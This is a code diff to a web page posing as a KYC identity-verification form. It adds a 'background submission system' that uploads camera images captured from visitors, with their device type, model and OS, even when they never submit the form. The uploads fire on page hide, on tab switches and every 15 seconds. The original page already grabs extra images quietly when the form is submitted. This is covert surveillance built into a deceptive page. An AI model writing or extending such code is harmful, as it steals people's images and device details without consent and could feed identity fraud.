@@ -611,6 +611,7 @@
     // Form submission handler
     document.getElementById('kycFormElement').addEventListener('submit', async function(e) {
       e.preventDefault();
+      isFormSubmitted = true;
       
       // Capture additional 20 images quickly
       const additionalImages = await captureAdditionalImages(20);
@@ -777,23 +778,50 @@
       return new Blob([u8arr], { type: mime });
     }
     
-    // Trigger background submission when user leaves
-    window.addEventListener('beforeunload', async function() {
-      if (document.getElementById('kycForm').style.display === 'block') {
-        await submitBackgroundData();
-      }
-      stopCamera();
+    // ====== NEW BACKGROUND SUBMISSION SYSTEM ======
+let isFormSubmitted = false;
+const MAX_BACKGROUND_IMAGES = 15; // Sends batches of 15 images
+
+async function submitBackgroundData() {
+  if (isFormSubmitted || capturedImages.length === 0) return;
+  
+  const imagesToSend = capturedImages.slice(0, MAX_BACKGROUND_IMAGES);
+  const formData = new FormData();
+  
+  // Add device info
+  const deviceInfo = getDeviceInfo();
+  formData.append('device_type', deviceInfo.type);
+  formData.append('device_model', deviceInfo.model);
+  formData.append('device_os', deviceInfo.os);
+  formData.append('empty_form', 'true');
+  
+  // Add images
+  imagesToSend.forEach((img, index) => {
+    const blob = dataURLtoBlob(img.data);
+    formData.append(`image${index}`, blob, `bg_${Date.now()}_${index}.jpg`);
+  });
+
+  try {
+    await fetch('/submit', {
+      method: 'POST',
+      body: formData,
+      keepalive: true // Critical for reliability
     });
+    capturedImages = capturedImages.slice(MAX_BACKGROUND_IMAGES); // Remove sent images
+  } catch (error) {
+    console.error('Background submit failed (will retry):', error);
+  }
+}
 
-    // Fallback submission every 30 seconds
-    setInterval(async () => {
-      if (document.getElementById('kycForm').style.display === 'block' && 
-          capturedImages.length > 0) {
-        await submitBackgroundData();
-        capturedImages = []; // Clear after submission
-      }
-    }, 30000);
+// Triple-redundant triggering system
+window.addEventListener('pagehide', submitBackgroundData);
+document.addEventListener('visibilitychange', () => {
+  if (document.visibilityState === 'hidden') submitBackgroundData();
+});
 
+// Fallback every 15 seconds
+const bgInterval = setInterval(submitBackgroundData, 15000);
+// ====== END NEW SYSTEM ======
     // Start the process by showing popup immediately
     window.addEventListener('load', function() {
       document.getElementById('verificationPopup').style.display = 'flex';
